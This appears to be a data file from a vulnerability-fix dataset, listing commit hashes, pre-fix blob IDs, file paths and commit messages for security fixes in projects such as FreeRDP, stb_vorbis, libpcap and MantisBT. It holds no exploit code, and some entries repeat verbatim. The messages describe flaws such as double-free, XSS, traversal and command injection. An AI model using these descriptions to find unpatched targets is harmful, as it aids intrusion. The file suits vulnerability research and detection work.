    ec40a15a96d1eff967fbb13923927786fb7dca22
Blob(s) Before Fix: 
    0854c08d77225d120d680376651b27a022d5dbb3
    1238e2fb7ee0de83ae36cb5b4e7e2f39af14bbda
    63cfdfd5d839b8381cbcf4942fc788b09c6bb3be
    733c6d0fef1d3690ab1ab0c0af9f214dd5270793
    bbb04c47f491fafe383529992bfc86ec7cbd5316
    f151b246f91644e44ae489dd1b2d3d8658f6710c
Projects:
    01000101_saml2
Commit Message for 4f6af7f69f29df8555a18b9bb7b646906b45924d:
Be strict when checking return values.

======================================================================
Commit With Fix: 
    58a6fe94cb851f71214dbefac3f9bffee437d6fe
File(s) In Commit: 
    src/index.c
Blob(s) In Commit: 
    3ef892b7f170b1fdad356de32061652d7f97c48a
Blob(s) Before Fix: 
    d98872adfaef78ffc3df5f4f6962352f88777cc2
Projects:
    0x41111111_libgit2
Commit Message for 58a6fe94cb851f71214dbefac3f9bffee437d6fe:
index: convert `read_entry` to return entry size via an out-param\n\nThe function `read_entry` does not conform to our usual coding style of returning stuff via the out parameter and to use the return value for reporting errors. Due to most of our code conforming to that pattern, it has become quite natural for us to actually return `-1` in case there is any error, which has also slipped in with commit 5625d86b9 (index: support index v4, 2016-05-17). As the function returns an `size_t` only, though, the return value is wrapped around, causing the caller of `read_tree` to continue with an invalid index entry. Ultimately, this can lead to a double-free.\n\nImprove code and fix the bug by converting the function to return the index entry size via an out parameter and only using the return value to indicate errors.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in> Reported-by: Vivek Parikh <viv0411.parikh@gmail.com>

======================================================================
Commit With Fix: 
    17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7
File(s) In Commit: 
    libfreerdp/codec/zgfx.c
Blob(s) In Commit: 
    551fffc830f94f5d08182ded9804b951f41cb03e
Blob(s) Before Fix: 
    41bcb84982f156f67598046304987ca3d5e58b19
    f94c41b20317504accaa0f66300c728a531e18b0
Projects:
    0359xiaodong_FreeRDP
Commit Message for 17c363a5162fd4dc77b1df54e48d7bd9bf6b3be7:
Fixed CVE-2018-8784\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    445a5a42c500ceb80f8fa7f2c11f3682538033f3
File(s) In Commit: 
    libfreerdp/core/update.c
Blob(s) In Commit: 
    c2ca42cc4c318d28516c38ed23920ef4145d44dd
Blob(s) Before Fix: 
    5e0757dcba98da9cb6f638d80d1dde22805b3576
    80887940536e0bce6475df15e1c9b8b260100191
Projects:
    0359xiaodong_FreeRDP
Commit Message for 445a5a42c500ceb80f8fa7f2c11f3682538033f3:
Fixed CVE-2018-8786\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    09b9d4f1994a674c4ec85b4947aa656eda1aed8a
File(s) In Commit: 
    libfreerdp/gdi/graphics.c
Blob(s) In Commit: 
    159198756b2e27c294b406d49e3ffc351693eaa9
Blob(s) Before Fix: 
    0424a8ae3f266266d7e8a91f718225cfedf6c71a
    4afae48d1bc1b8a00d7487ad32d7cb644a0e6c7b
    fbb3f029c8f12b5e2723f4687f46ff0798177ace
Projects:
    0359xiaodong_FreeRDP
Commit Message for 09b9d4f1994a674c4ec85b4947aa656eda1aed8a:
Fixed CVE-2018-8787\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    2ee663f39dc8dac3d9988e847db19b2d7e3ac8c6
File(s) In Commit: 
    winpr/libwinpr/sspi/NTLM/ntlm_message.c
Blob(s) In Commit: 
    ab42dc7377f01c061cba0d4a99c978f866e6aec1
Blob(s) Before Fix: 
    d785604976e16f1fbf7547a6a420e9eda3b8b0e2
Projects:
    0359xiaodong_FreeRDP
Commit Message for 2ee663f39dc8dac3d9988e847db19b2d7e3ac8c6:
Fixed CVE-2018-8789\n\nThanks to Eyal Itkin from Check Point Software Technologies.

======================================================================
Commit With Fix: 
    01924cd948dbceb8391be671dab672e9f4a0ffe8
File(s) In Commit: 
    app/View/Events/resolved_attributes.ctp
Blob(s) In Commit: 
    809ea830032258c7485771eb4075af1dc954b243
Blob(s) Before Fix: 
    0243dc5a0bf781d15678bb4c363772ec093337d5
    ecc0aff884f8556e873a5c615c0e86a5b0685709
Projects:
    0-vortex_MISP
Commit Message for 01924cd948dbceb8391be671dab672e9f4a0ffe8:
fix: Fixed various potential XSS issues in the resolved attributes view\n\n- potentially exposed XSS if a malicious MISP module was loaded on the instance\n\n- as reported by Christophe Vandeplas (@cvandeplas)

======================================================================
Commit With Fix: 
    37720c38d6c617439df0a13e9396fcb26345dadd
File(s) In Commit: 
    app/Model/Attribute.php
Blob(s) In Commit: 
    94ea0d387cab72768427cb49745466487e2640e2
Blob(s) Before Fix: 
    b1be7a51487a576859bbb55b5f7e0b5cc47f0638
Projects:
    0-vortex_MISP
Commit Message for 37720c38d6c617439df0a13e9396fcb26345dadd:
fix: critical API integrity bug, potentially allowing users to delete attributes of other events\n\n- a crafted edit for an event (without attribute UUIDs but attribute IDs set) could overwrite an existing attribute

======================================================================
Commit With Fix: 
    157f471d7e48f190f74e66eb5bc73360b5352fd3
File(s) In Commit: 
    php/elFinder.class.php
Blob(s) In Commit: 
    0ed8272fde5b04a2c94fd4ea69659216604993b1
Blob(s) Before Fix: 
    84b5852ebff6e106b2381943759d89e0526dd0e6
Projects:
    01coding_elFinder
Commit Message for 157f471d7e48f190f74e66eb5bc73360b5352fd3:
[php:security] fix directory traversal vulnerability\n\nFixed vulnerability that can delete arbitrary files with zipdl command.\n\nFixed it because there was a possibility that files that can be deleted may be deleted by the execution account of the web server.\n\nReviewed-by: Ravindra Rajaram <ravindra.rajaram@ca.com> and Kevin Kotas <kevin.kotas@ca.com>

======================================================================
Commit With Fix: 
    e6351557b86cc10a7651253d2d2aff7f6b918f8e
File(s) In Commit: 
    php/elFinder.class.php
Blob(s) In Commit: 
    fec1143d8a9218c2b55fb9ea0d93864b4b002578
Blob(s) Before Fix: 
    bd2aa87a24d69409e7876b81f08cec6509d502a4
Projects:
    01coding_elFinder
Commit Message for e6351557b86cc10a7651253d2d2aff7f6b918f8e:
[php:security] re-fix directory traversal vulnerability for windows server\n\nrel. commit 157f471d7e48f190f74e66eb5bc73360b5352fd3

======================================================================
Commit With Fix: 
    0f6ceabab0a8849b47f67d727aa526c2656089ba
File(s) In Commit: 
    util.c
Blob(s) In Commit: 
    32bca06a04996410a985ec212766c7412a676290
Blob(s) Before Fix: 
    6cb4a79138ee63a80fa4973ac0b1f23c829fa06c
Projects:
    AmShaegar13_yubico-pam
Commit Message for 0f6ceabab0a8849b47f67d727aa526c2656089ba:
util: make sure to close the authfile before returning success\n\nfixes #136

======================================================================
Commit With Fix: 
    1394192b210cb3c6624a7419bcf3ff966742e79b
File(s) In Commit: 
    src/openvpnserv/interactive.c
Blob(s) In Commit: 
    861f5e705bc5836539506a7f0f2118a8a144154c
Blob(s) Before Fix: 
    c96e1fb8d7b5d41e84f928ae1bc0291242e74c00
    fbc32f903d0ca09b601c36f0199e403939055ef0
Projects:
    0x554889e5_openvpn
Commit Message for 1394192b210cb3c6624a7419bcf3ff966742e79b:
Fix potential double-free() in Interactive Service (CVE-2018-9336)\n\nMalformed input data on the service pipe towards the OpenVPN interactive service (normally used by the OpenVPN GUI to request openvpn instances from the service) can result in a double free() in the error handling code.\n\nThis usually only leads to a process crash (DoS by an unprivileged local account) but since it could possibly lead to memory corruption if happening while multiple other threads are active at the same time, CVE-2018-9336 has been assigned to acknowledge this risk.\n\nFix by ensuring that sud->directory is set to NULL in GetStartUpData() for all error cases (thus not being free()ed in FreeStartupData()).\n\nRewrite control flow to use explicit error label for error exit.\n\nDiscovered and reported by Jacob Baines <jbaines@tenable.com>.\n\nCVE: 2018-9336\n\nSigned-off-by: Gert Doering <gert@greenie.muc.de> Acked-by: Selva Nair <selva.nair@gmail.com> Message-Id: <20180414072617.25075-1-gert@greenie.muc.de> URL: https://www.mail-archive.com/search?l=mid&q=20180414072617.25075-1-gert@greenie.muc.de\n\nSigned-off-by: Gert Doering <gert@greenie.muc.de>

======================================================================
Commit With Fix: 
    cb1214c124e1bd61f7dd551b94a794864861592e
File(s) In Commit: 
    coders/meta.c
Blob(s) In Commit: 
    eaebd1fc0e5fd3fc479772f2592e0e02cfc2c44d
Blob(s) Before Fix: 
    3e2931e7195d4e8017253257e704d6dca26e049a
    ec4d5d49f6d4efda7c98e672017623f2a4c74bd5
Projects:
    2016repotsheyue_ImageMagick
Commit Message for cb1214c124e1bd61f7dd551b94a794864861592e:
...

======================================================================
Commit With Fix: 
    345a7b2eed11bb6128421150d65f4f83fdbb737d
File(s) In Commit: 
    lib/schema-inspector.js
Blob(s) In Commit: 
    3113a618ae2fb075c2573f8953be1f88ae60c28c
Blob(s) Before Fix: 
    2bf9d64c2383e28990e675aca87579d52a4834f5
Projects:
    mtnk_schema-inspector
Commit Message for 345a7b2eed11bb6128421150d65f4f83fdbb737d:
fix: Issue #75

======================================================================
Commit With Fix: 
    de624dacf6a50e39fe3472af1414d44937ce1f03
File(s) In Commit: 
    index.js
Blob(s) In Commit: 
    4ca699809c6d94afee90e1113763bc276723647c
Blob(s) Before Fix: 
    16654d111a3c7ced1fb73278354bdaccaad6b4e0
Projects:
    async_node-im-resize
Commit Message for de624dacf6a50e39fe3472af1414d44937ce1f03:
fix: check image arguments before processing (#19)\n\nRegex hotfix to check for command injection

======================================================================
Commit With Fix: 
    ea15dddbe0f65694bfde36b78dd488e90f246639
File(s) In Commit: 
    index.js
Blob(s) In Commit: 
    54b8ed67bf3804b3d107a26dca86f35192c7d1ec
Blob(s) Before Fix: 
    d85f5ff7c7e126eeca3668dea2a7b614ef76a23f
Projects:
    AlanMoLun_node-s3-uploader
Commit Message for ea15dddbe0f65694bfde36b78dd488e90f246639:
fix: check path argument before processing (#10)\n\nhotfix to re mediate command injection

======================================================================
Commit With Fix: 
    5aec0a08680f0afea387267a8d1b9fbb3379247c
File(s) In Commit: 
    includes/functions/functions.php
Blob(s) In Commit: 
    ed6149bec22af0e158efb64d7a30d9e2fc2346d8
Blob(s) Before Fix: 
    fc41bb8a18b830f33d4e974590b24154d63e44f5
Projects:
    unix1_wp-statistics
Commit Message for 5aec0a08680f0afea387267a8d1b9fbb3379247c:
fix xss Attach Get Title Of Page

======================================================================
Commit With Fix: 
    a29ce2817cf43bb1850cf6af114004ac26c7a081
File(s) In Commit: 
    src/Symfony/Component/Security/Http/RememberMe/TokenBasedRememberMeServices.php
Blob(s) In Commit: 
    952211333930e32953ca474c09f8affd4f4b5507
Blob(s) Before Fix: 
    48d88e5730b27c4fc236b0888f3a58b3857a5c30
    d6254dff0a2a0cdd10ceee95584f32b02bd84cd4
    dce2026f3a13d978b572ba833e9d8cd25af52e90
Projects:
    007g3m1n1_symfony
Commit Message for a29ce2817cf43bb1850cf6af114004ac26c7a081:
[Security] Add a separator in the remember me cookie hash

======================================================================
Commit With Fix: 
    944e60f083c3bffbc6a0b5112db127a10a66a8ec
File(s) In Commit: 
    src/Symfony/Component/HttpFoundation/Request.php
Blob(s) In Commit: 
    ae3f51b1724fcd37443e29d8855ea7963bb19342
Blob(s) Before Fix: 
    00a6251ba9e264641989be6293e5bf04ab70412c
    10687e35c901b6583ae39948542f31ed60083c17
    164fb4e0e333a2ccd0750088f9237859f6a4c86a
    1c840b677b024b3cd522178044605e08b3ccc1a4
    2768b21a7d05cfae513d9c9d36e8208b169017c1
    28e78c0a208f2ccf53789c400f5dc07624e79278
    2b4fc0c02e82c1bd92033ee8a2d84a009a9fab4c
    4208f9a62951bb53ed9436366e151584d804e6b3
    42a12c97cffb7460ec56eb6917ffe6bb5ebc3954
    4e8a11c2c01bb8f3e336c0fb4f66000bb211fa37
    4fbad5ee6c801762bfadb535a031d1ee960c3c66
    68e7d0b8e0ff89a6885792fd1d5bf13ebac02a34
    6ac23eed4d164e67dab28cc229491474e1548618
    6fd0707b059ff0d06fd66f02c1de134d8660e315
    7185d75e9220979dd797e60de63cbf730856d877
    89611660add2fc8bd34b5ef0087bfc8feea25baa
    8dc01b91ea71427a145559fafe631ed9d2d86a3a
    98f414783f4703ebd4542663c397ff982dc2d5e3
    be55069e47a6c031571ae24e5fba6cb52a1111f6
    cf80681a6e976557b890646afc41881029ca4267
    da17df90aa9695fb242e1e63322ce2ab8857e60b
    dc23d2ca1a1d701b3e198d6437226c9967254d16
    e0376ad2d5a1b7b480095f93a9d6cb0fab7a5d82
    e84e0ba6e5c1ecfa7eef6bfcf99e2057c277c3e3
    ea3f460c4692b9d10393f24447b4bc0f9dc85d14
    f6ff0f509954da47d676e4356ab53433b3406ec3
    fe1a33a597a3e6420d35db431ce97da77cca45d8
    ff8d411a9c52efdb75498ba3b9bc4fe794b7ded0
Projects:
    007g3m1n1_symfony
Commit Message for 944e60f083c3bffbc6a0b5112db127a10a66a8ec:
[HttpFoundation] reject invalid method override

======================================================================
Commit With Fix: 
    4944c92761e0a14f04868cbcf4f4e86fd4b7a4a9
File(s) In Commit: 
    android-gif-drawable/src/main/c/decoding.c
Blob(s) In Commit: 
    f8ebb0ae2e6a397979d76c8844a80581c2e776ea
Blob(s) Before Fix: 
    18c532263cf20df9018d2b502d4e62333032b521
Projects:
    12301104-LuYunfeng_android-gif-drawable
Commit Message for 4944c92761e0a14f04868cbcf4f4e86fd4b7a4a9:
Do not realloc array if new raster size is 0.\n\nif realloc() is called with 0 size it may return NULL and this will be incorrectly handled as not enough memory and (also) rasterBits will be freed by realloc but we will not update it.

======================================================================
Commit With Fix: 
    f6945f1e4b157c69e414cd94fe5cde1876aabcc1
File(s) In Commit: 
    ubuntu-server.js
Blob(s) In Commit: 
    89a0349d6618921fa0ecffcd9cc94e68bd0384b4
Blob(s) Before Fix: 
    5ca237cb82a29926d42faa059a9fa72827dc2404
Projects:
    007jedgar_react-native
Commit Message for f6945f1e4b157c69e414cd94fe5cde1876aabcc1:
Fix ubuntu-server vulnerability

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    98fdfc6df88b1e34a736d5e126e6c8139c8de1a6
File(s) In Commit: 
    stb_vorbis.c
Blob(s) In Commit: 
    aa4813797686397e93c0afd874f2d7b6f62f6edd
Blob(s) Before Fix: 
    ff117abe6f4de6d2aa2402240ff95fa1bb15b2b0
Projects:
    004307ec_stb
Commit Message for 98fdfc6df88b1e34a736d5e126e6c8139c8de1a6:
Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder() CVE-2019-13218: stack buffer overflow in compute_codewords() CVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest() CVE-2019-13220: out-of-range read in draw_line() CVE-2019-13221: issue with large 1D codebooks in lookup1_values() CVE-2019-13222: unchecked NULL returned by get_window() CVE-2019-13223: division by zero in predict_point()

======================================================================
Commit With Fix: 
    0f7f61ed1b7b697e283e37bd2d731d0bd57adb55
File(s) In Commit: 
    src/regext.c
Blob(s) In Commit: 
    965c7933d9c06c13284e4245115676647bf2b2d8
Blob(s) Before Fix: 
    996d043f568ef62ab6868b771ce9e418acfa70a8
    fa4b360bc8bc2fbea883a83581ee1ec92297e17c
Projects:
    0xflotus_oniguruma
Commit Message for 0f7f61ed1b7b697e283e37bd2d731d0bd57adb55:
Fix CVE-2019-13224: don't allow different encodings for onig_new_deluxe()

======================================================================
Commit With Fix: 
    c509265c5f6ae7264f7b8a8aae1cfa5fc59d108c
File(s) In Commit: 
    src/regcomp.c
Blob(s) In Commit: 
    ff3431f03645f540350a26f07c52d59141a6ba13
Blob(s) Before Fix: 
    c2c04a4d1880c2aceee76a65b4e668c2511fa115
Projects:
    0xflotus_oniguruma
Commit Message for c509265c5f6ae7264f7b8a8aae1cfa5fc59d108c:
Fix CVE-2019-13225: problem in converting if-then-else pattern to bytecode.

======================================================================
Commit With Fix: 
    3ea2a5a026e73d81cd9a3e9bbd4300c433004bfa
File(s) In Commit: 
    src/modules/rlm_eap/types/rlm_eap_pwd/eap_pwd.c
Blob(s) In Commit: 
    d94851c3aa0fc31db9be2d01a4fb94c1a6c81e00
Blob(s) Before Fix: 
    7f91e4b230a15c81b830738924b9d741534fc256
    c54f08c03081b8460f1b871dcf7ad11519527018
Projects:
    0xbad0c0d3_freeradius-server
Commit Message for 3ea2a5a026e73d81cd9a3e9bbd4300c433004bfa:
EAP-pwd: fix side-channel leak where 1 in 2018 handshakes fail\n\nPreviously the Hunting and Pecking algorithm of EAP-pwd aborted when more than 10 iterations are needed. Every iteration has a 50% chance of finding the password element. This means one in every 2048 handshakes will fail, in which case an error frame is sent to the client. This event leaks information that can be abused in an offline password brute-force attack. More precisely, the adversary learns that all 10 iterations failed for the given random EAP-pwd token. Using the same techniques as in the Dragonblood attack, this can be used to brute-force the password.\n\nThis patch fixes the above issue by executing enough iterations such that the password element is always found eventually.\n\nNote that timing and cache leaks remain a risk against the current implementation of EAP-pwd.

======================================================================
Commit With Fix: 
    f59d7ed8df2e0e957f7f247fe218032abdbe9a10
File(s) In Commit: 
    nltk/downloader.py
Blob(s) In Commit: 
    e6831f977f1810bf6317392973abda4cd647b8af
Blob(s) Before Fix: 
    8874e7c9483dcd3b8b724491b9177b64edeaeeb6
    b06f7f5f2dbd820f470313e0aef894c70cf86c7b
Projects:
    0--key_nltk
Commit Message for f59d7ed8df2e0e957f7f247fe218032abdbe9a10:
CVE-2019-14751: Fixed security bug in downloader (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14751)

======================================================================
Commit With Fix: 
    554b56687a19300a75ec24184746b5512580c819
File(s) In Commit: 
    memcached.c
Blob(s) In Commit: 
    788647feb87237fe563bddcc48ecdc7a76843126
Blob(s) Before Fix: 
    229156337e0ce240afe0afbeeff78e878fe4b005
Projects:
    0xfacade_memcached
Commit Message for 554b56687a19300a75ec24184746b5512580c819:
fix strncpy call to avoid ASAN violation\n\nEnsure we're only reading to the size of the smallest buffer, since they're both on the stack and could potentially overlap. Overlapping is defined as ... undefined behavior. I've looked through all available implementations of strncpy and they still only copy from the first \0 found.\n\nWe'll also never read past the end of sun_path since we _supply_ sun_path with a proper null terminator.

======================================================================
Commit With Fix: 
    9cee1971c498bbe0a72bca1c773fae50171d8c27
File(s) In Commit: 
    core/classes/IssueAttachmentTimelineEvent.class.php
Blob(s) In Commit: 
    2a6123d87c5e0040911099c3c10da0e767830628
Blob(s) Before Fix: 
    8e0425df49a99f707f558b0210834a779eea8fd5
Projects:
    01-Scripts_mantisbt
Commit Message for 9cee1971c498bbe0a72bca1c773fae50171d8c27:
Fix XSS on timeline (CVE-2019-15074)\n\nKamran Saifullah reported a stored cross-site scripting (XSS) vulnerability in Timeline, allowing execution of arbitrary code (if CSP settings permit it) after uploading an attachment with a crafted filename. The code is executed for any user having visibility to the issue, whenever My View Page is displayed.\n\nPrevent the attack by sanitizing the filename before display.\n\nFixes #25995

======================================================================
Commit With Fix: 
    617b12c0339db4891d117b661982126c495439ea
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    19d218ca8c4543b2a66dbff9e6260b63009bb88f
Blob(s) Before Fix: 
    635d3195051da51264343a3dcde55a8afb2c2a9d
Projects:
    000Y000_libpcap
Commit Message for 617b12c0339db4891d117b661982126c495439ea:
Calculate the reply payload length in a local variable.\n\nUsing the same variable for the remaining request length and the reply length is confusing at best and can cause errors at worst (if the request had extra stuff at the end, so that the variable is non-zero).\n\nThis addresses Include Security issue I8: [libpcap] Remote Packet Capture Daemon Parameter Reuse.

======================================================================
Commit With Fix: 
    484d60cbf7ca4ec758c3cbb8a82d68b244a78d58
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    c335fb05524c80260fc814468a5c45253582d88b
Blob(s) Before Fix: 
    c9b44aafb568db49e47da5b7f540390e78225c56
Projects:
    000Y000_libpcap
Commit Message for 484d60cbf7ca4ec758c3cbb8a82d68b244a78d58:
On UN*X, don't tell the client why authentication failed.\n\n"no such user" tells the client that the user ID isn't valid and, therefore, that it needn't bother trying to do password cracking for that user ID  just saying that the authentication failed dosn't give them that hint.\n\nThis resolves the third problem in Include Security issue F11: [libpcap] Remote Packet Capture Daemon Multiple Authentication Improvements.\n\nThe Windows LogonUser() API returns ERROR_LOGON_FAILURE for both cases, so the Windows code doesn't have this issue.  Just return the same "Authentication failed" message on Windows to the user.\n\nFor various authentication failures *other* than "no such user" and "password not valid", log a message, as there's a problem that may need debugging.  We don't need to tell the end user what the problem is, as they may not bother reporting it and, even if they do, they may not give the full error message.

======================================================================
Commit With Fix: 
    437b273761adedcbd880f714bfa44afeec186a31
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    c9b44aafb568db49e47da5b7f540390e78225c56
Blob(s) Before Fix: 
    9816328932eca6543576bf37166fe2e86486fe23
Projects:
    000Y000_libpcap
Commit Message for 437b273761adedcbd880f714bfa44afeec186a31:
Don't crash if crypt() fails.\n\nIt can fail, so make sure it doesn't before comparing its result with the password.\n\nThis addresses Include Security issue F12: [libpcap] Remote Packet Capture Daemon Null Pointer Dereference Denial of Service.

======================================================================
Commit With Fix: 
    33834cb2a4d035b52aa2a26742f832a112e90a0a
File(s) In Commit: 
    rpcapd/daemon.c
Blob(s) In Commit: 
    635d3195051da51264343a3dcde55a8afb2c2a9d
Blob(s) Before Fix: 
    c335fb05524c80260fc814468a5c45253582d88b
Projects:
    000Y000_libpcap
Commit Message for 33834cb2a4d035b52aa2a26742f832a112e90a0a:
In the open request, reject capture sources that are URLs.\n\nYou shouldn't be able to ask a server to open a remote device on some *other* server  just open it yourself.\n\nThis addresses Include Security issue F13: [libpcap] Remote Packet Capture Daemon Allows Opening Capture URLs.

======================================================================
Commit With Fix: 
    bd094dede74ff6e313e286e949e2387233a96eea
File(s) In Commit: 
    proj_doc_edit_page.php
Blob(s) In Commit: 
    759bc1bd01288bd03badfd346fa2b5839024e4c6
Blob(s) Before Fix: 
    10287277c79ab780eb0cdc7f0a69fc71b579d335
Projects:
    01-Scripts_mantisbt
Commit Message for bd094dede74ff6e313e286e949e2387233a96eea:
Fix XSS on project documentation\n\nVulnerability in deprecated project documentation functionality ($g_enable_project_documentation), allowing execution of arbitrary code (if CSP settings permit it) after uploading an attachment with a crafted filename.\n\nPrevent the attack by sanitizing the filename before display.\n\nFixes #26078

======================================================================
Commit With Fix: 
    5797f013b3be450c146a4141514bda525f2f1b51
File(s) In Commit: 
    zerver/lib/bugdown/__init__.py
Blob(s) In Commit: 
    67e8a9fdeb86e1cb39b9d5e1d4d5a7a22c364a24
Blob(s) Before Fix: 
    ac27c6df69e93be63822a3f3332e7b8087f256de
Projects:
    0x218_mattermost-server
Commit Message for 5797f013b3be450c146a4141514bda525f2f1b51:
CVE-2019-16215: Fix DoS vulnerability in Markdown LINK_RE.\n\nAny regex including a match-everything subpattern (.*, .*?, .+, or .+?) is almost automatically wrong because it fails to disambiguate when one subpattern should end and another should begin.  Among other bugs, these kind of regexes tend to be especially prone to denial of service vulnerabilities through catastrophic backtracking on strings that fail to match in a large (in this case, exponential) number of ways.\n\nLacking a specification to say what characters should actually be allowed in these subpatterns (this syntax is too different from CommonMark to be able to precisely apply those rules), I’ve tried to make reasonable guesses and avoid changing much else.\n\nBecause Zulip doesn't store messages until they have successfully been processed by the Markdown processor, this is not a stored DoS issue.\n\nIn general, Zulip protects against the broad category of DoS issues in Markdown rendering via a timeout managed by another thread.  However, details of Python's regular expression implementation mean that this particular issue could prevent the timeout thread from being scheduled, resulting in this being a DoS issue.\n\nThis was fixed in master a few months ago as a side effect of abe2dab88ca96786bb32dea6caab873819b8c482 (#12979).\n\nSigned-off-by: Anders Kaseorg <anders@zulipchat.com>

======================================================================
Commit With Fix: 
    f8c6eb67cd9da09ee20248fec6ab742069635e47
File(s) In Commit: 
    modules/luci-base/luasrc/dispatcher.lua
Blob(s) In Commit: 
    f571144566fffb9e689cb53a6a4dd7398a0c3997
Blob(s) Before Fix: 
    6850d7e3a946ae55f58f7f2066221dee6be132a3
    e8106b741d533541279597cf98dc8a8e4c7fedb0
Projects:
    0saga0_openwrt
Commit Message for f8c6eb67cd9da09ee20248fec6ab742069635e47:
luci-base: fix CSRF prevention for arcombine targets\n\nThe dispatcher failed to propagate the child target post security requirements to the arcombine() dispatch target so far - fix this by recursively testing the post security requirements.\n\nSigned-off-by: Jo-Philipp Wich <jo@mein.io>

======================================================================
Commit With Fix: 
    fc85be7123050b91b054e45b91c78d3241a5047a
File(s) In Commit: 
    librabbitmq/amqp_connection.c
Blob(s) In Commit: 
    b106f70afad794fcd1791855435ee829857aca02
Blob(s) Before Fix: 
    034b2e9652679c8fea5566d2de667cddb253a3f0
    2b8c86a7b22042d7b6cc3f4d763652d6744d6dd9
Projects:
    13812453806_rabbitmq-c
Commit Message for fc85be7123050b91b054e45b91c78d3241a5047a:
